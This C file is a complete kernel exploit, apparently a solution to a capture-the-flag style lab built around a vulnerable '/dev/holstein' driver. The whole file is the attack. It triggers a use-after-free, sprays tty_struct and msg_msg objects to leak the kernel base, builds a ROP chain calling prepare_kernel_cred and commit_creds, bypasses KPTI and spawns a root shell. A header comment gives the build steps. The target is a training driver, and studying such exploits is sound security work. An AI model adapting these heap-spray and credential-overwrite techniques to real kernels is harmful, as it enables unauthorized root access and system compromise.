// One liner to add exploit to filesystem
// gcc exploit.c -o exploit -static && cp exploit rootfs && cd rootfs && find . -print0 | cpio -o --format=newc --null --owner=root > ../rootfs.cpio && cd ../

#include <stdio.h> /* printf */
#include <sys/types.h> /* open */
#include <sys/stat.h> /* open */
#include <fcntl.h> /* open */
#include <stdlib.h> /* exit */
#include <stdint.h> /* int_t's */
#include <unistd.h> /* getuid */
#include <string.h> /* memset */
#include <sys/ipc.h> /* msg_msg */ 
#include <sys/msg.h> /* msg_msg */
#include <sys/ioctl.h> /* ioctl */
#include <stdarg.h> /* va_args */
#include <stdbool.h> /* true, false */ 

#define DEV "/dev/holstein"
#define PTMX "/dev/ptmx"

#define PTMX_SPRAY (size_t)50       // Number of terminals to allocate
#define MSG_SPRAY (size_t)32        // Number of msg_msg's per queue
#define NUM_QUEUE (size_t)4         // Number of msg queues
#define MSG_SZ (size_t)512          // Size of each msg_msg, modulo 8 == 0
#define GBUF_SZ (size_t)0x400       // Size of g_buf in driver

// User state globals
uint64_t user_cs;
uint64_t user_ss;
uint64_t user_rflags;
uint64_t user_sp;

// Mutable globals, when in Rome
uint64_t base;
uint64_t rop_addr;
uint64_t fake_table;
uint64_t ioctl_ptr;
int open_ptmx[PTMX_SPRAY] = { 0 };          // Store fds for clean up/ioctl()
int num_ptmx = 0;                           // Number of open fds
int msg_queue[NUM_QUEUE] = { 0 };           // Initialized message queues
int num_queue = 0;

// Misc constants. 
const uint64_t rop_len = 200;
const uint64_t ioctl_off = 12 * sizeof(uint64_t);

// Gadgets
// 0x723c0: commit_creds
uint64_t commit_creds;
// 0x72560: prepare_kernel_cred
uint64_t prepare_kernel_cred;
// 0x800e10: swapgs_restore_regs_and_return_to_usermode
uint64_t kpti_tramp;
// 0x14fbea: push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret; (stack pivot)
uint64_t push_rdx;
// 0x35738d: pop rdi; ret;
uint64_t pop_rdi;
// 0x487980: xchg rdi, rax; sar bh, 0x89; ret;
uint64_t xchg_rdi_rax;
// 0x32afea: ret;
uint64_t ret;

void err(const char* format, ...) {
    if (!format) {
        exit(-1);
    }

    fprintf(stderr, "%s", "[!] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
    exit(-1);
}

void info(const char* format, ...) {
    if (!format) {
        return;
    }
    
    fprintf(stderr, "%s", "[*] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
}

void save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"   
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        // Push CPU flags onto stack
        "pushf;"
        // Pop CPU flags into var
        "pop user_rflags;"
        ".att_syntax;"
    );
}

// Should spawn a root shell
void pop_shell(void) {
    uid_t uid = getuid();
    if (uid != 0) {
        err("We are not root, wtf?");
    }

    info("We got root, spawning shell!");
    system("/bin/sh");
    exit(0);
}

// Open a char device, just exit on error, this is exploit code
int open_device(char *dev, int flags) {
    int fd = -1;
    if (!dev) {
        err("NULL ptr given to `open_device()`");
    }

    fd = open(dev, flags);
    if (fd < 0) {
        err("Failed to open '%s'", dev);
    }

    return fd;
}

// Spray kmalloc-1024 sized '/dev/ptmx' structures on the kernel heap
void alloc_ptmx() {
    int fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (fd < 0) {
        err("Failed to open /dev/ptmx");
    }

    open_ptmx[num_ptmx] = fd;
    num_ptmx++;
}

// Check to see if we have a reference to a tty_struct by reading in the magic
// number for the current allocation in our slab
bool found_ptmx(int fd) {
    unsigned char magic_buf[4];
    if (fd < 0) {
        err("Bad fd given to `found_ptmx()`\n");
    }

    ssize_t bytes_read = read(fd, magic_buf, 4);
    if (bytes_read != (ssize_t)bytes_read) {
        err("Failed to read enough bytes from fd: %d", fd);
    }

    if (*(int32_t *)magic_buf != 0x5401) {
        return false;
    }

    return true;
}

// Leak a tty_struct->ops field which is constant offset from kernel base
uint64_t leak_ops(int fd) {
    if (fd < 0) {
        err("Bad fd given to `leak_ops()`");
    }

    /* tty_struct {
        int magic;      // 4 bytes
        struct kref;    // 4 bytes (single member is an int refcount_t)
        struct device *dev; // 8 bytes
        struct tty_driver *driver; // 8 bytes
        const struct tty_operations *ops; (offset 24 (or 0x18))
        ...
    } */

    // Read first 32 bytes of the structure
    unsigned char *ops_buf = calloc(1, 32);
    if (!ops_buf) {
        err("Failed to allocate ops_buf");
    }

    ssize_t bytes_read = read(fd, ops_buf, 32);
    if (bytes_read != (ssize_t)32) {
        err("Failed to read enough bytes from fd: %d", fd);
    }

    uint64_t ops = *(uint64_t *)&ops_buf[24];
    info("tty_struct->ops: 0x%lx", ops);

    // Solve for kernel base, keep the last 12 bits
    uint64_t test = ops & 0b111111111111;

    // These magic compares are for static offsets on this kernel
    if (test == 0xb40ULL) {
        return ops - 0xc39b40ULL;
    }

    else if (test == 0xc60ULL) {
        return ops - 0xc39c60ULL;
    }

    else {
        err("Got an unexpected tty_struct->ops ptr");
    }
}

void solve_gadgets(void) {
    // 0x723c0: commit_creds
    commit_creds = base + 0x723c0ULL;
    printf("    >> commit_creds located @ 0x%lx\n", commit_creds);

    // 0x72560: prepare_kernel_cred
    prepare_kernel_cred = base + 0x72560ULL;
    printf("    >> prepare_kernel_cred located @ 0x%lx\n", prepare_kernel_cred);

    // 0x800e10: swapgs_restore_regs_and_return_to_usermode
    kpti_tramp = base + 0x800e10ULL + 22; // 22 offset, avoid pops
    printf("    >> kpti_tramp located @ 0x%lx\n", kpti_tramp);

    // 0x14fbea: push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret;
    push_rdx = base + 0x14fbeaULL;
    printf("    >> push_rdx located @ 0x%lx\n", push_rdx);

    // 0x35738d: pop rdi; ret;
    pop_rdi = base + 0x35738dULL;
    printf("    >> pop_rdi located @ 0x%lx\n", pop_rdi);

    // 0x487980: xchg rdi, rax; sar bh, 0x89; ret;
    xchg_rdi_rax = base + 0x487980ULL;
    printf("    >> xchg_rdi_rax located @ 0x%lx\n", xchg_rdi_rax);

    // 0x32afea: ret;
    ret = base + 0x32afeaULL;
    printf("    >> ret located @ 0x%lx\n", ret);
}

// Initialize a kernel message queue
int init_msg_q(void) {
    int msg_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msg_qid == -1) {
        err("`msgget()` failed to initialize queue");
    }

    msg_queue[num_queue] = msg_qid;
    num_queue++;
}

// Allocate one msg_msg on the heap
size_t send_message() {
    // Calcuate current queue
    if (num_queue < 1) {
        err("`send_message()` called with no message queues");
    }
    int curr_q = msg_queue[num_queue - 1];

    // Send message
    size_t fails = 0;
    struct msgbuf {
        long mtype;
        char mtext[MSG_SZ];
    } msg;

    // Unique identifier we can use
    msg.mtype = 0x1337;

    // Construct the ROP chain
    memset(msg.mtext, 0, MSG_SZ);

    // Pattern for offsets (debugging)
    uint64_t base = 0x41;
    uint64_t *curr = (uint64_t *)&msg.mtext[0];
    for (size_t i = 0; i < 25; i++) {
        uint64_t fill = base << 56;
        fill |= base << 48;
        fill |= base << 40;
        fill |= base << 32;
        fill |= base << 24;
        fill |= base << 16;
        fill |= base << 8;
        fill |= base;
        
        *curr++ = fill;
        base++; 
    }

    // ROP chain
    uint64_t *rop = (uint64_t *)&msg.mtext[0];
    *rop++ = pop_rdi; 
    *rop++ = 0x0;
    *rop++ = prepare_kernel_cred; // RAX now holds ptr to new creds
    *rop++ = xchg_rdi_rax; // Place creds into RDI 
    *rop++ = commit_creds; // Now we have super powers
    *rop++ = kpti_tramp;
    *rop++ = 0x0; // pop rax inside kpti_tramp
    *rop++ = 0x0; // pop rdi inside kpti_tramp
    *rop++ = (uint64_t)pop_shell; // Return here
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop   = user_ss;

    /* struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                struct file *filp, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        unsigned int (*write_room)(struct tty_struct *tty);
        unsigned int (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                unsigned int cmd, unsigned long arg);
        ...
    } */

    // Populate the 12 function pointers in the table that we have created.
    // There are 3 handlers that are invoked for allocated tty_structs when 
    // their controlling process exits, they are close(), shutdown(),
    // and cleanup(). We have to overwrite these pointers for when we exit our
    // exploit process or else the kernel will panic with a RIP of 
    // 0xdeadbeefdeadbeef. We overwrite them with a simple ret gadget
    uint64_t *func_table = (uint64_t *)&msg.mtext[rop_len];
    for (size_t i = 0; i < 12; i++) {
        // If i == 4, we're on the close() handler, set to ret gadget
        if (i == 4) { *func_table++ = ret; continue; }

        // If i == 5, we're on the shutdown() handler, set to ret gadget
        if (i == 5) { *func_table++ = ret; continue; }

        // If i == 6, we're on the cleanup() handler, set to ret gadget
        if (i == 6) { *func_table++ = ret; continue; }

        // Magic value for debugging
        *func_table++ = 0xdeadbeefdeadbe00 + i;
    }

    // Put our gadget address as the ioctl() handler to pivot stack
    *func_table = push_rdx;

    // Spray msg_msg's on the heap
    if (msgsnd(curr_q, &msg, MSG_SZ, IPC_NOWAIT) == -1) {
        fails++;
    }

    return fails;
}

// Check to see if we have a reference to one of our msg_msg structs
bool found_msg(int fd) {
    // Read out the msg_msg
    unsigned char msg_buf[GBUF_SZ] = { 0 };
    ssize_t bytes_read = read(fd, msg_buf, GBUF_SZ);
    if (bytes_read != (ssize_t)GBUF_SZ) {
        err("Failed to read from holstein");
    }

    /* msg_msg {
        struct list_head m_list {
            struct list_head *next, *prev;
        } // 16 bytes
        long m_type; // 8 bytes
        int m_ts; // 4 bytes
        struct msg_msgseg* next; // 8 bytes
        void *security; // 8 bytes

        ===== Body Starts Here (offset 48) =====
    }*/ 

    // Some heuristics to see if we indeed have a good msg_msg
    uint64_t next = *(uint64_t *)&msg_buf[0];
    uint64_t prev = *(uint64_t *)&msg_buf[sizeof(uint64_t)];
    int64_t m_type = *(uint64_t *)&msg_buf[sizeof(uint64_t) * 2];

    // Not one of our msg_msg structs
    if (m_type != 0x1337L) {
        return false;
    }

    // We have to have valid pointers
    if (next == 0 || prev == 0) {
        return false;
    }

    // I think the pointers should be different as well
    if (next == prev) {
        return false;
    }

    info("Found msg_msg struct:");
    printf("    >> msg_msg.m_list.next: 0x%lx\n", next);
    printf("    >> msg_msg.m_list.prev: 0x%lx\n", prev);
    printf("    >> msg_msg.m_type: 0x%lx\n", m_type);

    // Update rop address
    rop_addr = 48 + next;
    
    return true;
}

void overwrite_ops(int fd) {
    unsigned char g_buf[GBUF_SZ] = { 0 };
    ssize_t bytes_read = read(fd, g_buf, GBUF_SZ);
    if (bytes_read != (ssize_t)GBUF_SZ) {
        err("Failed to read enough bytes from fd: %d", fd);
    }

    // Overwrite the tty_struct->ops pointer with ROP address
    *(uint64_t *)&g_buf[24] = fake_table;
    ssize_t bytes_written = write(fd, g_buf, GBUF_SZ);
    if (bytes_written != (ssize_t)GBUF_SZ) {
        err("Failed to write enough bytes to fd: %d", fd);
    }
}

int main(int argc, char *argv[]) {
    int fd1;
    int fd2;
    int fd3;
    int fd4;
    int fd5;
    int fd6;

    info("Saving user space state...");
    save_state();

    info("Freeing fd1...");
    fd1 = open_device(DEV, O_RDWR);
    fd2 = open(DEV, O_RDWR);
    close(fd1);

    // Allocate '/dev/ptmx' structs until we allocate one in our free'd slab
    info("Spraying tty_structs...");
    size_t p_remain = PTMX_SPRAY;
    while (p_remain--) {
        alloc_ptmx();
        printf("    >> tty_struct(s) alloc'd: %lu\n", PTMX_SPRAY - p_remain);

        // Check to see if we found one of our tty_structs
        if (found_ptmx(fd2)) {
            break;
        }

        if (p_remain == 0) { err("Failed to find tty_struct"); }
    }

    info("Leaking tty_struct->ops...");
    base = leak_ops(fd2);
    info("Kernel base: 0x%lx", base);

    // Clean up open fds
    info("Cleaning up our tty_structs...");
    for (size_t i = 0; i < num_ptmx; i++) {
        close(open_ptmx[i]);
        open_ptmx[i] = 0;
    }
    num_ptmx = 0;

    // Solve the gadget addresses now that we have base
    info("Solving gadget addresses");
    solve_gadgets();

    // Create a hole for a msg_msg
    info("Freeing fd3...");
    fd3 = open_device(DEV, O_RDWR);
    fd4 = open_device(DEV, O_RDWR);
    close(fd3);

    // Allocate msg_msg structs until we allocate one in our free'd slab
    size_t q_remain = NUM_QUEUE;
    size_t fails = 0;
    while (q_remain--) {
        // Initialize a message queue for spraying msg_msg structs
        init_msg_q();
        printf("    >> msg_msg queue(s) initialized: %lu\n",
            NUM_QUEUE - q_remain);
        
        // Spray messages for this queue
        for (size_t i = 0; i < MSG_SPRAY; i++) {
            fails += send_message();
        }

        // Check to see if we found a msg_msg struct
        if (found_msg(fd4)) {
            break;
        }
        
        if (q_remain == 0) { err("Failed to find msg_msg struct"); }
    }
    
    // Solve our ROP chain address
    info("`msgsnd()` failures: %lu", fails);
    info("ROP chain address: 0x%lx", rop_addr);
    fake_table = rop_addr + rop_len;
    info("Fake tty_struct->ops function table: 0x%lx", fake_table);
    ioctl_ptr = fake_table + ioctl_off;
    info("Fake ioctl() handler: 0x%lx", ioctl_ptr);

    // Do a 3rd UAF
    info("Freeing fd5...");
    fd5 = open_device(DEV, O_RDWR);
    fd6 = open_device(DEV, O_RDWR);
    close(fd5);

    // Spray more /dev/ptmx terminals
    info("Spraying tty_structs...");
    p_remain = PTMX_SPRAY;
    while(p_remain--) {
        alloc_ptmx();
        printf("    >> tty_struct(s) alloc'd: %lu\n", PTMX_SPRAY - p_remain);

        // Check to see if we found a tty_struct
        if (found_ptmx(fd6)) {
            break;
        }

        if (p_remain == 0) { err("Failed to find tty_struct"); }
    }

    info("Found new tty_struct");
    info("Overwriting tty_struct->ops pointer with fake table...");
    overwrite_ops(fd6);
    info("Overwrote tty_struct->ops");

    // Spam IOCTL on all of our '/dev/ptmx' fds
    info("Spamming `ioctl()`...");
    for (size_t i = 0; i < num_ptmx; i++) {
        ioctl(open_ptmx[i], 0xcafebabe, rop_addr - 8); // pop rbp; ret;
    }

    return 0;
}